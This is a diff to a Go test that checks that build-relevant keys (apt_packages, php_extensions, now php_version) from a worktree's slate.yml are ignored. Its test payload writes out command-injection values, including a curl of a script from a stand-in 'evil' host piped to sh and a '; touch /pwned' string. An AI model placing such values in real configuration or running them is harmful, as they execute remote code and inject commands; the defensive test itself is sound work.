@@ -644,6 +644,7 @@ func TestDockerfileContentKeysAreNotTakenFromTheWorktree(t *testing.T) {
 	// a compromised dependency rewrites the working copy to smuggle a root
 	// build step into the image
 	payload := "scaffold: laravel\n" +
+		"php_version: \"8.5.12\"\n" +
 		"apt_packages: [\"x && curl http://evil/x.sh | sh\"]\n" +
 		"php_extensions: [\"; touch /pwned\"]\n"
 	if err := os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte(payload), 0o644); err != nil {
@@ -660,8 +661,11 @@ func TestDockerfileContentKeysAreNotTakenFromTheWorktree(t *testing.T) {
 	if exts := cfg.StringSlice("php_extensions"); len(exts) != 0 {
 		t.Errorf("php_extensions from the worktree must be ignored, got %v", exts)
 	}
-	if pinned := TrustPinned(mainRoot, wsDir); !slices.Contains(pinned, "apt_packages") || !slices.Contains(pinned, "php_extensions") {
-		t.Errorf("TrustPinned = %v, want it to report apt_packages and php_extensions as inert", pinned)
+	if v := cfg.String("php_version"); v != "" {
+		t.Errorf("php_version from the worktree must be ignored, got %q", v)
+	}
+	if pinned := TrustPinned(mainRoot, wsDir); !slices.Contains(pinned, "apt_packages") || !slices.Contains(pinned, "php_extensions") || !slices.Contains(pinned, "php_version") {
+		t.Errorf("TrustPinned = %v, want it to report php_version, apt_packages and php_extensions as inert", pinned)
 	}
 }
 
